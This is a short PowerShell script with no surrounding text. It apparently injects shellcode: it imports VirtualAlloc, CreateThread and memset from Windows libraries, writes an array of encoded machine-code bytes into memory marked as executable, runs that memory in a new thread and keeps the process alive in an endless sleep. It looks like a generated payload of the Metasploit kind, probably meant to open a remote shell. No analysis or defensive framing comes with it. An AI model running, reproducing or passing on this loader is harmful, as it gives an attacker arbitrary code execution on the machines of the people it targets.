$uGIa = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $uGIa -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xb8,0xbe,0xa3,0xf2,0x8a,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xea,0x42,0x41,0x07,0x76,0x52,0x04,0xe8,0x87,0xa2,0x69,0x60,0x62,0x93,0xa9,0x16,0xe6,0x83,0x19,0x5c,0xaa,0x2f,0xd1,0x30,0x5f,0xa4,0x97,0x9c,0x50,0x0d,0x1d,0xfb,0x5f,0x8e,0x0e,0x3f,0xc1,0x0c,0x4d,0x6c,0x21,0x2d,0x9e,0x61,0x20,0x6a,0xc3,0x88,0x70,0x23,0x8f,0x3f,0x65,0x40,0xc5,0x83,0x0e,0x1a,0xcb,0x83,0xf3,0xea,0xea,0xa2,0xa5,0x61,0xb5,0x64,0x47,0xa6,0xcd,0x2c,0x5f,0xab,0xe8,0xe7,0xd4,0x1f,0x86,0xf9,0x3c,0x6e,0x67,0x55,0x01,0x5f,0x9a,0xa7,0x45,0x67,0x45,0xd2,0xbf,0x94,0xf8,0xe5,0x7b,0xe7,0x26,0x63,0x98,0x4f,0xac,0xd3,0x44,0x6e,0x61,0x85,0x0f,0x7c,0xce,0xc1,0x48,0x60,0xd1,0x06,0xe3,0x9c,0x5a,0xa9,0x24,0x15,0x18,0x8e,0xe0,0x7e,0xfa,0xaf,0xb1,0xda,0xad,0xd0,0xa2,0x85,0x12,0x75,0xa8,0x2b,0x46,0x04,0xf3,0x23,0xab,0x25,0x0c,0xb3,0xa3,0x3e,0x7f,0x81,0x6c,0x95,0x17,0xa9,0xe5,0x33,0xef,0xce,0xdf,0x84,0x7f,0x31,0xe0,0xf4,0x56,0xf5,0xb4,0xa4,0xc0,0xdc,0xb4,0x2e,0x11,0xe1,0x60,0xda,0x14,0x75,0x4b,0xb3,0x16,0x8f,0x23,0xc6,0x18,0x9e,0xef,0x4f,0xfe,0xf0,0x5f,0x00,0xaf,0xb0,0x0f,0xe0,0x1f,0x58,0x5a,0xef,0x40,0x78,0x65,0x25,0xe9,0x12,0x8a,0x90,0x41,0x8a,0x33,0xb9,0x1a,0x2b,0xbb,0x17,0x67,0x6b,0x37,0x94,0x97,0x25,0xb0,0xd1,0x8b,0xd1,0x30,0xac,0xf6,0x77,0x4e,0x1a,0x9c,0x77,0xda,0xa1,0x37,0x20,0x72,0xa8,0x6e,0x06,0xdd,0x53,0x45,0x1d,0xd4,0xc1,0x26,0x49,0x19,0x06,0xa7,0x89,0x4f,0x4c,0xa7,0xe1,0x37,0x34,0xf4,0x14,0x38,0xe1,0x68,0x85,0xad,0x0a,0xd9,0x7a,0x65,0x63,0xe7,0xa5,0x41,0x2c,0x18,0x80,0x53,0x10,0xcf,0xec,0x21,0x78,0xd3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RxIo=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RxIo.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RxIo,0,0,0);for (;;){Start-sleep 60};
